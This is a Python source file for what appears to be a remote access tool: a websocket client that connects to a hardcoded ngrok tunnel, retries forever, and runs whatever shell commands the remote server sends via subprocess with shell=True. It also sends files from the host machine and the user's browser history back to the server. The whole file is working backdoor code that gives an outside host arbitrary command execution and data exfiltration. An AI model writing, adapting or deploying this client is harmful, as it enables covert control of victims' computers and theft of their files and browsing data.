import asyncio
import json
import ssl

# import ssl

import websockets
import os
import subprocess
import time

from browser.monitor_website import fetch_hist
from utils import handle_cd, download_file, maintain_client_status, modify_result, handle_ls


async def start_client():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.load_verify_locations(cafile='./server.crt')
    uri = "wss://0.tcp.au.ngrok.io:10635/ws/client"

    while True:
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                active = 0
                while True:
                    print("Active status: ", active)
                    try:
                        while not active:
                            print("waiting")
                            command = await websocket.recv()
                            active = command
                            time.sleep(0.001)
                            await websocket.send(f"cwd%`{os.getcwd()}")
                            continue

                        time.sleep(0.001)
                        # Receive command from the server
                        command = await websocket.recv()

                        if command.lower().startswith('switch'):
                            print("switched")
                            active = 0
                            continue
                        elif command.lower().startswith('%*&#!download'):
                            # Extracting filename from the command
                            _, filepath = command.split(' ', 1)
                            print(f"receive filepath {filepath}")
                            await websocket.send(f"%*&#!download {filepath}")

                            await download_file(websocket, filepath=f"{os.getcwd()}/{filepath}")
                            continue
                        elif command.lower().startswith('history'):
                            await websocket.send("history")
                            hist = fetch_hist()
                            await websocket.send(hist)
                            continue

                        elif command.lower().startswith('cd'):
                            cd = True

                        cd_result = handle_cd(command)
                        if cd_result:
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(cd_result))
                            continue

                        result = subprocess.run(command, shell=True, capture_output=True, text=True)

                        # Handle if the command returns nothing
                        if result.stdout == "":
                            await websocket.send("Null")
                            continue

                        # Send the result back to the server
                        if command.lower().startswith('ls'):
                            response = handle_ls(result)
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(response))
                            continue

                        await websocket.send(result.stdout)
                        continue

                    except Exception as e:
                        # Send any errors back to the server
                        await websocket.send(str(e))
                        continue
        except websockets.exceptions.ConnectionClosedError:
            print("Connection closed. Retrying in 3 seconds...")
            time.sleep(3)
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            print("Closing connection")


if __name__ == "__main__":
    asyncio.run(start_client())
